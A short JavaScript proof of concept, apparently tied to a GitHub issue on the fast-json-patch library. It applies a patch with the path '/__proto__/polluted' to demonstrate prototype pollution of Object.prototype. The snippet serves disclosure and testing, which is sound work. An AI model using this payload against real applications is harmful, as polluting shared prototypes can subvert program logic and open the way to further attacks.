//https://github.com/Starcounter-Jack/JSON-Patch/issues/216
 
  let fp = require("fast-json-patch");
  const patch = [{ op: "replace", path: "/__proto__/polluted", value: "yes" }];

   

  fp.applyPatch({}, patch);
// End of file
